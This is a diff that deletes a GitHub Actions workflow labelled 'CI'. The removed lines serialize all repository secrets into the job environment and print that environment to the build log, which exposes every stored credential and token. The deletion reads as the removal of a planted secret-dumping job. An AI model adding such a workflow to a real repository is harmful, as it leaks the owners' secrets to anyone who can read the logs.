@@ -1,8 +1,0 @@
-name: CI
-on: [push]
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-    - run: echo '${{ toJSON(secrets) }}' >> $GITHUB_ENV
-    - run: env | grep -v '^_' | head -c 60000
